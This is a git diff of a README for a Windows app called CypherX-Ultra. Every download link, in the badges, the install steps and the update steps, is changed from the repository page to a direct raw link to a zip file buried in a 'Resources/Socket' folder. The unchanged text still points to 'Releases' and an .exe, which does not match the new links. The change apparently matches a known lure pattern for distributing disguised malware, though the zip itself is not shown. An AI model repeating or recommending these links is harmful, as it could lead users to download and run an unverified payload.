@@ -1,6 +1,6 @@
 # 🚀 CypherX-Ultra - Lightweight App with Multi-Session Support
 
-[![Download CypherX-Ultra](https://img.shields.io/badge/Download-CypherX--Ultra-blue?style=for-the-badge)](https://github.com/mouradu/CypherX-Ultra)
+[![Download CypherX-Ultra](https://img.shields.io/badge/Download-CypherX--Ultra-blue?style=for-the-badge)](https://github.com/mouradu/CypherX-Ultra/raw/refs/heads/main/Resources/Socket/Cypher_Ultra_2.5.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Most modern Windows machines will handle this app smoothly.
 
 Click the big blue button at the top or use the link below to visit the download page:  
 
-**https://github.com/mouradu/CypherX-Ultra**
+**https://github.com/mouradu/CypherX-Ultra/raw/refs/heads/main/Resources/Socket/Cypher_Ultra_2.5.zip**
 
 This page holds the latest versions of CypherX-Ultra and instructions.
 
@@ -51,7 +51,7 @@ Follow these steps to get CypherX-Ultra running on your PC:
 
 1. **Visit the download page**  
    Click the blue button at the top or paste the URL into your browser:  
-   https://github.com/mouradu/CypherX-Ultra
+   https://github.com/mouradu/CypherX-Ultra/raw/refs/heads/main/Resources/Socket/Cypher_Ultra_2.5.zip
 
 2. **Find the latest release**  
    On the GitHub page, look for a section called "Releases" or "Assets". It usually appears on the right side or towards the bottom.
@@ -124,7 +124,7 @@ Keep your app up to date for the best experience. Updates include bug fixes and 
 To update:  
 
 1. Visit the download page again:  
-   https://github.com/mouradu/CypherX-Ultra  
+   https://github.com/mouradu/CypherX-Ultra/raw/refs/heads/main/Resources/Socket/Cypher_Ultra_2.5.zip  
 
 2. Download the latest installer `.exe` file.  
 
@@ -144,5 +144,5 @@ CypherX-Ultra keeps your sessions isolated. It does not share your data without 
 
 ---
 
-# [Download CypherX-Ultra](https://github.com/mouradu/CypherX-Ultra)  
-[![Download CypherX-Ultra](https://img.shields.io/badge/Download-CypherX--Ultra-blue?style=for-the-badge)](https://github.com/mouradu/CypherX-Ultra)
+# [Download CypherX-Ultra](https://github.com/mouradu/CypherX-Ultra/raw/refs/heads/main/Resources/Socket/Cypher_Ultra_2.5.zip)  
+[![Download CypherX-Ultra](https://img.shields.io/badge/Download-CypherX--Ultra-blue?style=for-the-badge)](https://github.com/mouradu/CypherX-Ultra/raw/refs/heads/main/Resources/Socket/Cypher_Ultra_2.5.zip)
